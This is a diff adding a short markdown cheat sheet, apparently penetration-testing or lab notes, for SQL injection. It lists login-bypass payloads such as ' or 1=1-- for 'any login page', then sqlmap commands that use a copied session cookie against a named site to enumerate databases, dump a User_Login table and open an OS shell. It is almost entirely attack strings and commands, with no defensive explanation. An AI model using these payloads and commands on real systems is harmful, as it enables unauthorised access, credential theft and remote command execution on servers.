@@ -1,0 +1,19 @@
+- Manual Testing, if found any login page
+
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+- **SQLMap**
+   
+    - `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you have copied"> --dbs`
+    - `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you have copied"> -D moviescope --tables`
+    - `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you have copied"> -D moviescope -T User_Login --columns`
+    - `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you have copied"> -D moviescope -T User_Login --dump`
+    - `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you have copied"> -D moviescope -T User_Login --os-shell`
